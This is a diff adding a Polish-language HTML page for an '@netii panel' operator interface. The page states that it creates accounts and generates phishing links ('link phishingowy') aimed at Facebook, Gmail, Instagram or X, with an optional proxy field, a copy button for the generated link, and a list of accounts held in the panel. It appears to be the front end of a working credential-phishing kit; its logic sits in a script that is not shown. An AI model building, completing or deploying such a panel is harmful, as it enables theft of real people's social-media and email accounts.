@@ -1,0 +1,116 @@
+<!doctype html>
+<html lang="pl">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Add User — Panel</title>
+  <link rel="stylesheet" href="/style.css"/>
+</head>
+<body>
+
+<div id="app">
+  <aside id="sidebar">
+    <div class="sidebar-logo">
+      <span class="logo-icon">⬡</span>
+      <span class="logo-text">@netii panel</span>
+    </div>
+    <nav class="sidebar-nav">
+      <button class="nav-item active" data-tab="adduser">
+        <span class="nav-icon">➕</span>
+        <span>Add User</span>
+      </button>
+      <button class="nav-item" onclick="location.href='/'">
+        <span class="nav-icon">🏠</span>
+        <span>Dashboard</span>
+      </button>
+    </nav>
+    <div class="sidebar-footer">
+      <button id="logoutBtn" class="logout-btn-full" title="Wyloguj">⏻ Wyloguj</button>
+    </div>
+  </aside>
+
+  <main id="content">
+    <div id="topbar">
+      <div class="breadcrumb">
+        MY WORKSPACE / <span id="crumb-label">Add User</span>
+      </div>
+    </div>
+
+    <div id="tab-adduser" class="tab active">
+      <div class="page-header">
+        <div>
+          <h1>Add User</h1>
+          <p class="page-sub">Utwórz nowe konto i wygeneruj link phishingowy.</p>
+        </div>
+      </div>
+
+      <div class="add-box">
+        <div class="add-box-header">
+          <span class="add-step-label">Nowe konto</span>
+        </div>
+        <div class="add-fields">
+          <div class="field-group">
+            <label class="field-label">Imię / nazwa</label>
+            <input id="addName" class="field-input" placeholder="np. Jan Kowalski" autofocus/>
+          </div>
+          <div class="field-group">
+            <label class="field-label">Proxy <span class="field-opt">(opcjonalnie)</span></label>
+            <input id="addProxy" class="field-input" placeholder="np. socks5://user:pass@host:1080 lub http://host:8080"/>
+            <p class="field-hint">Zostaw puste, aby użyć domyślnego proxy serwera (lub bezpośrednio dla Gmaila).</p>
+          </div>
+          <div class="field-group">
+            <label class="field-label">Platforma</label>
+            <div class="plat-grid">
+              <button class="plat-btn" data-platform="facebook" data-url="https://www.facebook.com/">
+                <span class="plat-icon plat-fb">f</span>
+                <span>Facebook</span>
+              </button>
+              <button class="plat-btn" data-platform="gmail" data-url="https://mail.google.com/mail/u/0/">
+                <span class="plat-icon plat-gm">G</span>
+                <span>Gmail</span>
+              </button>
+              <button class="plat-btn" data-platform="instagram" data-url="https://www.instagram.com/">
+                <span class="plat-icon plat-ig">◎</span>
+                <span>Instagram</span>
+              </button>
+              <button class="plat-btn" data-platform="twitter" data-url="https://x.com/">
+                <span class="plat-icon plat-x">𝕏</span>
+                <span>X / Twitter</span>
+              </button>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Result: generated link shown after creation -->
+      <div id="linkResult" class="add-box" style="display:none;">
+        <div class="add-box-header">
+          <span class="add-step-label">✓ Konto utworzone</span>
+        </div>
+        <div class="add-fields">
+          <div class="field-group">
+            <label class="field-label">Link phishingowy</label>
+            <div style="display:flex;gap:8px;align-items:center;">
+              <input id="genLink" class="field-input" readonly style="flex:1;cursor:pointer;" onclick="this.select()"/>
+              <button id="copyLinkBtn" type="button">Kopiuj</button>
+            </div>
+          </div>
+          <div class="field-group">
+            <button id="addAnotherBtn" type="button" style="width:auto;">➕ Dodaj kolejne</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="created-accounts">
+        <div class="created-accounts-head">Konta w panelu</div>
+        <div id="acctMiniList" class="minimal-acct-list"></div>
+      </div>
+    </div>
+  </main>
+</div>
+
+<div id="toastContainer"></div>
+
+<script src="/adduser.js"></script>
+</body>
+</html>
